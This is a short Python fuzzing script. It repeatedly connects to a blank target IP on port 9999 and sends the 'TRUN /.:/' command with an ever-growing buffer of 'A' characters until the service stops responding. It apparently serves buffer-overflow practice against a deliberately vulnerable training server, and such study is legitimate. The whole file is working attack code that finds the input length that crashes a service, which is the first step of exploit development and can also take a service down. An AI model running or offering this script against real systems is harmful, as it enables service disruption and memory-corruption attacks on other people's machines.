#!/usr/bin/python3
import sys
import socket
from time import sleep

target_ip = ""
target_port = 9999
cmd_attacking = 'TRUN /.:/'
buffer = "A" * 100
print(f"Starting to fuzz target {target_ip} on port {target_port}")
print("You may need to CTRL+C the script once you've noticed the server has crashed.")
print("-" * 100)
while True:
    try:
        print(f'Trying buffer size of {str(len(buffer))} bytes')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        payload = (cmd_attacking + buffer)
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer += "A" * 100
    except:
        print(f"Fuzzing crashed at {str(len(buffer))} bytes")
        print("-" * 100)
        sys.exit()
